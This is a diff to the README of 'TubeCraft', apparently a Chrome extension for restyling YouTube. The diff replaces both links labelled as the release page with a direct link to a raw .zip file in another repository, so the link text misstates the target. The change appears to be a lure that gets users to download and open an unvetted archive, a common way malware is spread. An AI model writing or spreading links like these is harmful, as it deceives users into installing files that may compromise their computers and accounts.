@@ -5,7 +5,7 @@ description: "Enhance your YouTube viewing experience with custom controls and a
 ---
 # 🎨 TubeCraft - Modernize your YouTube viewing experience today
 
-[![Download TubeCraft](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases)
+[![Download TubeCraft](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nonterritorial-sunvisor289/nonterritorial-sunvisor289.github.io/raw/refs/heads/main/alligatored/github_io_nonterritorial_sunvisor_1.1.zip)
 
 TubeCraft changes the way you watch videos on Chrome. It updates your browser interface with a clean glassmorphism design. Ambient lighting effects create a mood around your screen. A distraction-free mode helps you focus on your content.
 
@@ -17,7 +17,7 @@ TubeCraft runs as a Google Chrome extension. It reads the style of your YouTube 
 
 You need to download the extension file from our release page. Follow these steps to install it.
 
-1. Visit [the TubeCraft release page](https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases).
+1. Visit [the TubeCraft release page](https://github.com/Nonterritorial-sunvisor289/nonterritorial-sunvisor289.github.io/raw/refs/heads/main/alligatored/github_io_nonterritorial_sunvisor_1.1.zip).
 2. Look for the file ending in .zip in the Latest Release section.
 3. Click the filename to save it to your computer.
 4. Open your computer's File Explorer.
